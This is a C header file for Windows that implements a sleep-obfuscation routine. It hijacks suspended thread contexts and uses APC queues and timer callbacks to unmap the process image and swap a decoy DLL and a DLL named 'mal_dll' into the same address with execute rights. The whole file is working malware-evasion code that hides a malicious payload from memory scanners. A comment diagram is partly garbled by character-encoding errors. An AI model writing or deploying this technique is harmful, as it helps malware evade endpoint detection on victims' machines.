#pragma once

#include <Windows.h>
#include "headers.h"


VOID CALLBACK ResumeThreadCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
{
    HANDLE hThread = (HANDLE)lpParameter;
    ResumeThread(hThread);
}


/*

Main thread
    ©¦
    ©À©¤ Initialization phase (0-several ms)
    ©¦   ©À©¤ Create event object
    ©¦   ©À©¤ Allocate CONTEXT memory
    ©¦   ©¸©¤ Create thread 2 (suspended state)
    ©¦
    ©À©¤ Configure thread 2
    ©¦   ©À©¤ Get thread context
    ©¦   ©À©¤ Modify to WaitForSingleObjectEx(NtTestAlert returns)
    ©¦   ©¸©¤ Resume thread 2 execution
    ©¦
    ©À©¤ Create other threads
    ©¦   ©À©¤ CreateThread0 (suspended): UnmapViewOfFile
    ©¦   ©À©¤ CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
    ©¦   ©¸©¤ CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
    ©¦
    ©À©¤ Configure thread context
    ©¦   ©À©¤ Thread 0: UnmapViewOfFile(image_base)
    ©¦   ©À©¤ Thread 1: MapViewOfFileEx(sac_dll¡úimage_base)
    ©¦   ©¸©¤ Thread 3: MapViewOfFileEx(mal_dll¡úimage_base)
    ©¦
    ©À©¤ Create timer queue
    ©¦
    ©À©¤ Set APC queue (thread 2)
    ©¦   ©À©¤ APC1: UnmapViewOfFile(image_base)
    ©¦   ©À©¤ APC2: ResumeThread (Thread 3)
    ©¦   ©¸©¤ APC3: ExitThread (thread 2 itself)
    ©¦
    ©À©¤ Set timer
    ©¦   ©À©¤ Timer 1 (200ms): ResumeThread (Thread 0)
    ©¦   ©¸©¤ Timer 2 (300ms): ResumeThread (Thread 1)
    ©¦
    ©¸©¤ Wait for all threads to complete

*/

int sleaping(
    PVOID image_base,
    HANDLE sac_dll_handle,
    HANDLE mal_dll_handle,
    SIZE_T view_size,
    PNT_FUNCTIONS nt_func_s,
    PVOID NtTestAlert_addr
)
{

    HANDLE dummy_event = { 0 };
    HANDLE thread_array[4] = { NULL };

    HANDLE timer_queue = NULL;

    HANDLE timer_unmap = NULL;
    HANDLE timer_map = NULL;

    int result = 0;

    // create a manual sync event to sync threads
    if (!NT_SUCCESS(nt_func_s->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
    {
        return -1;
    }

    // allocate thread context 
    CONTEXT* context_0 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_1 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_2 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_3 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (context_0 == NULL
        || context_1 == NULL
        || context_2 == NULL
        || context_3 == NULL
        )
    {
        result = -1;
        goto __clean_up_event;
    }

    context_0->ContextFlags = CONTEXT_ALL;
    context_1->ContextFlags = CONTEXT_ALL;
    context_2->ContextFlags = CONTEXT_ALL;
    context_3->ContextFlags = CONTEXT_ALL;


    // create a suspended waiting thread.
    thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[2] == NULL)
    {
        result = -1;
        goto __clean_up_context;
    }

    // get the context of the waiting thread.
    if (!GetThreadContext(thread_array[2], context_2))
    {
        result = -1;
        goto __clean_up_context;
    }

    // Set up thread context to call WaitForSingleObjectEx with NtTestAlert on stack
    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)NtTestAlert_addr;
    (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
    (*context_2).Rcx = (DWORD64)(dummy_event);
    (*context_2).Rdx = (DWORD64)21000;         // 21 second timeout
    (*context_2).R8 = FALSE;


    if (!SetThreadContext(thread_array[2], context_2))
    {
        result = -1;
        goto __clean_up_context;
    }

    // wait + APCs
    // resume the thread that is going to wait the sleep time and then execute the APCs
    if (!ResumeThread(thread_array[2]))
    {
        result = -1;
        goto __clean_up_context;
    }

    // Create suspend threads for memory  operations.
    thread_array[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    thread_array[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    thread_array[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);

    //*buggy = MapViewOfFileEx;

    if (thread_array[0] == NULL || thread_array[1] == NULL || thread_array[3] == NULL)
    {
        result = -1;
        goto __clean_up_context;
    }

    if (!GetThreadContext(thread_array[0], context_0) ||
        !GetThreadContext(thread_array[1], context_1) ||
        !GetThreadContext(thread_array[3], context_3))
    {
        result = -1;
        goto __clean_up_context;
    }


    // Configure thread 0 for UnmapViewOfFile
    *(ULONG_PTR*)((*context_0).Rsp) = (DWORD64)(ExitThread);
    (*context_0).Rip = (DWORD64)UnmapViewOfFile;
    (*context_0).Rcx = (DWORD64)(image_base);

    // Configure thread 1 for MapViewOfFileEx (sac_dll)
    *(ULONG_PTR*)((*context_1).Rsp) = (DWORD64)(ExitThread);
    (*context_1).Rip = (DWORD64)MapViewOfFileEx;
    (*context_1).Rcx = (DWORD64)sac_dll_handle;
    (*context_1).Rdx = FILE_MAP_ALL_ACCESS;
    (*context_1).R8 = (DWORD64)0x0;
    (*context_1).R9 = (DWORD64)0x0;

    // the offset must be the either hex 28 or int 40
    // (5th argument, 6th argument
    *(ULONG_PTR*)((*context_1).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_1).Rsp + 48) = (ULONG_PTR)image_base;


    // Configure thread 3 for MapViewOfFileEx (mal_dll)
    *(ULONG_PTR*)((*context_3).Rsp) = (DWORD64)ExitThread;
    (*context_3).Rip = (DWORD64)MapViewOfFileEx;
    (*context_3).Rcx = (DWORD64)mal_dll_handle;
    (*context_3).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*context_3).R8 = (DWORD64)0x00;
    (*context_3).R9 = (DWORD64)0x00;

    // the offset must be the either hex 28 or int 40
    *(ULONG_PTR*)((*context_3).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_3).Rsp + 48) = (ULONG_PTR)image_base;


    if (!SetThreadContext(thread_array[0], context_0) ||
        !SetThreadContext(thread_array[1], context_1) ||
        !SetThreadContext(thread_array[3], context_3))
    {
        result = -1;
        goto __clean_up_context;
    }



    timer_queue = CreateTimerQueue();
    if (timer_queue == NULL)
    {
        result = -1;
        goto __clean_up_context;
    }

    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
    {
        result = -1;
        goto __clean_up_timer;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
    {
        result = -1;
        goto __clean_up_timer;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
    {
        result = -1;
        goto __clean_up_timer;
    }

    // unmap
    if (!CreateTimerQueueTimer(&timer_unmap, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD))
    {
        result = -1;
        goto __clean_up_timer;
    }

    // map
    if (!CreateTimerQueueTimer(&timer_map, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD))
    {
        result = -1;
        goto __clean_up_timer;
    }


    if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
    {
        result = -1;
        goto __clean_up_timer;
    }


__clean_up_timer:
    if (timer_map != NULL)
        DeleteTimerQueueTimer(timer_queue, timer_map, NULL);
    if (timer_unmap != NULL)
        DeleteTimerQueueTimer(timer_queue, timer_unmap, NULL);

    DeleteTimerQueue(timer_queue);

__clean_up_context:
    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
    if (context_1) VirtualFree(context_1, 0, MEM_RELEASE);
    if (context_2) VirtualFree(context_2, 0, MEM_RELEASE);
    if (context_3) VirtualFree(context_3, 0, MEM_RELEASE);

__clean_up_event:
    if (dummy_event) CloseHandle(dummy_event);


    return result;
}

